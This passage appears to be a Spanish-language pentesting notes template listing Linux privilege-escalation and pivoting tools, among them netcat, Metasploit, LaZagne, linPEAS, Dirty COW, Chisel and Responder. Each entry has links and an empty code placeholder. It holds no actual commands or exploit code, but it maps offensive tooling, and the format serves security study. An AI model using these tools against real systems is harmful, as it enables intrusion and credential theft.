*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️



<details>

<summary>🐧 ESCALADA DE PRIVILEGIOS LINUX ❌</summary>

### ESCALADA DE PRIVILEGIOS LINUX

*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LaZagne👈 --------------------------------->[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/47/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/lazagne-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows-y-linux)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GTFObins👈 --------------------------------->[https://gtfobins.github.io/](https://gtfobins.github.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GTFObins👈 --------------------------------->[https://gtfobins.github.io/](https://gtfobins.github.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GTFObins👈 --------------------------------->[https://gtfobins.github.io/](https://gtfobins.github.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LINUX KERNEL CVEs👈 --------------------------------->[https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LINENUM👈 --------------------------------->[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LINPEAS👈 --------------------------------->[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ENUMERACION SMART LINUX👈 --------------------------------->[https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LINUXPRIVCHECKER👈 --------------------------------->[https://github.com/sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LINUX EXPLOIT SUGGESTER👈 --------------------------------->[https://github.com/The-Z-Labs/linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTRICKS👈 --------------------------------->[https://book.hacktricks.xyz/v/es/welcome/readme](https://book.hacktricks.xyz/v/es/welcome/readme)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CHKROOTKIT👈 --------------------------------->[https://github.com/Magentron/chkrootkit](https://github.com/Magentron/chkrootkit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LYNIS👈 --------------------------------->[https://github.com/CISOfy/lynis](https://github.com/CISOfy/lynis)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] UNIX-PRIVESC-CHECK👈 --------------------------------->[https://github.com/pentestmonkey/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DIRDTYCOW👈 --------------------------------->[https://github.com/firefart/dirtycow](https://github.com/firefart/dirtycow)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] PRIV-ESCALATION metodos👈 --------------------------------->[https://github.com/KevinLiebergen/priv-escalation](https://github.com/KevinLiebergen/priv-escalation)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FILESEC GTFO win y linux👈 --------------------------------->[https://filesec.io/](https://filesec.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] RESPONDER👈 --------------------------------->[https://www.kali.org/tools/responder/ ](https://www.kali.org/tools/responder/)-->[https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️



<details>

<summary>♻️ PIVOTING ❌</summary>

### PIVOTING

*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] PROXYCHAINS👈 --------------------------------->[https://github.com/rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NCAT👈 --------------------------------->[https://nmap.org/ncat/](https://nmap.org/ncat/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CHISEL👈 --------------------------------->[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/chisel-creacion-de-tunel-entre-servidores-local-y-remoto-tambien-para-aprovechar-pivoting)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CORKSCREW👈 --------------------------------->[https://github.com/bryanpkc/corkscrew](https://github.com/bryanpkc/corkscrew)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METERPRETER👈 --------------------------------->[https://www.metasploit.com/](https://www.metasploit.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] REGEORG👈 --------------------------------->[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] RPIVOT👈 --------------------------------->[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀





